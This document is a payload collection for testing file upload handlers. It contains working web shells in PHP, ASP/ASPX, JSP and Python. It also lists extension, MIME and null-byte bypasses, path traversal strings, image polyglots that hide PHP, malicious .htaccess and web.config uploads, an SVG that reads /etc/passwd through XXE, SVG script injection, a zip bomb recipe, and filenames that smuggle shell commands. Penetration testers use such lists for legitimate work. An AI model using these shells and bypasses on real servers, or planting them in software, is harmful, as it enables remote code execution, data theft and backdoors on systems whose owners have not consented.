# File Upload Security Testing Payloads

# PHP Web Shells
# Basic PHP shell
<?php system($_GET['cmd']); ?>

# Advanced PHP shell
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

# One-liner PHP shells
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?=`$_GET[0]`?>

# File Extension Bypass Techniques
# Double extensions
shell.php.jpg
shell.php.png
shell.php.gif
shell.php.pdf

# Null byte injection
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png

# Case sensitivity bypass
shell.PHP
shell.Php
shell.pHp
SHELL.PHP

# Alternative extensions
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
shell.phps

# Special characters
shell.php.
shell.php::$DATA
shell.php%20
shell.php%0a
shell.php%0d%0a

# MIME Type Bypass
# Upload shell.php with these Content-Type headers:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain
Content-Type: application/octet-stream

# Path Traversal in Filename
../../../var/www/html/shell.php
..\\..\\..\\inetpub\\wwwroot\\shell.php
....//....//....//var//www//html//shell.php
%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2fwww%2fhtml%2fshell.php

# Directory Traversal Payloads
../
..\\
..;/
..;\\
....//
....\\\\
%2e%2e%2f
%2e%2e%5c
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216

# SVG with JavaScript
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("XSS in SVG");
   </script>
</svg>

# Malicious SVG (save as .svg)
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
<circle cx="50" cy="50" r="40" />
</svg>

# GIF with PHP code
GIF89a
<?php system($_GET['cmd']); ?>

# JPEG with PHP code
ÿØÿà JFIF
<?php system($_GET['cmd']); ?>

# PNG with PHP code
‰PNG
<?php system($_GET['cmd']); ?>

# Polyglot files (valid image + executable code)
# Create with: echo -e "\x47\x49\x46\x38\x39\x61\x3c\x3f\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x20\x3f\x3e" > polyglot.gif

# ASP/ASPX shells
<%eval request("cmd")%>
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>

# JSP shell
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<% if (request.getParameter("cmd") != null) { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %>

# Python shell (if server supports)
import os; os.system(request.args.get('cmd'))

# Filename injection payloads
; touch /tmp/pwned.txt
| touch /tmp/pwned.txt
& touch /tmp/pwned.txt
&& touch /tmp/pwned.txt
|| touch /tmp/pwned.txt
`touch /tmp/pwned.txt`
$(touch /tmp/pwned.txt)

# Long filename (buffer overflow attempt)
# Generate with: python -c "print 'A' * 1000"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php

# Unicode filename bypass
shell.php
shell.php (with unicode characters)
shell․php (using unicode dot)
shell‍.php (using zero-width joiner)

# Archive files with malicious content
# ZIP file containing ../../../shell.php
# RAR file with path traversal
# TAR file with symlinks

# .htaccess file upload (if allowed)
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

# Web.config file upload (IIS)
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Response.write("-"&"->")
%>

# File content validation bypass
# Add valid image header to PHP shell
GIF89a<?php system($_GET['cmd']); ?>
ÿØÿà<?php system($_GET['cmd']); ?>
‰PNG<?php system($_GET['cmd']); ?>

# Zip bomb (for DoS testing)
# Create with: dd if=/dev/zero bs=1M count=1000 | gzip > bomb.gz

# XXE in SVG
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>

# Server-Side Template Injection in filename
{{7*7}}.jpg
${7*7}.jpg
<%= 7*7 %>.jpg
#{7*7}.jpg

# Command injection in filename
; ls -la;.jpg
| whoami |.jpg
& id &.jpg
`id`.jpg
$(id).jpg